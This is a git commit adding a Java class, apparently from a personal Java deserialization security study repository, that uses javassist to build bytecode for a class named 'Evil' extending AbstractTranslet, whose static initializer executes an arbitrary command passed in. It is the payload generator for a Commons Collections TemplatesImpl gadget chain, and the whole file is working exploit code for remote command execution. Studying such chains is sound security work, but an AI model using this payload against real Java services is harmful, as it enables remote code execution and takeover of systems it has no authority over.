bf47c939b9ab79665df8d8356d292096c94a94bb
Drun1baby <2717763591@qq.com>
2023-05-06 16:23:53 +0800

    temp File

---
+++ JavaSecurity/CC/CC3/src/main/CC3ysoEXP/CalcShell.java
@@ -0,0 +1,28 @@
+package main.CC3ysoEXP;
+
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+
+public class CalcShell {
+    public static byte[] getTemplatesImpl(String cmd) {
+        try {
+            ClassPool pool = ClassPool.getDefault();
+            CtClass ctClass = pool.makeClass("Evil");
+            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            ctClass.setSuperclass(superClass);
+            CtConstructor constructor = ctClass.makeClassInitializer();
+            constructor.setBody(" try {\n" +
+                    " Runtime.getRuntime().exec(\"" + cmd +
+                    "\");\n" +
+                    " } catch (Exception ignored) {\n" +
+                    " }");
+            byte[] bytes = ctClass.toBytecode();
+            ctClass.defrost();
+            return bytes;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return new byte[]{};
+        }
+    }
+}
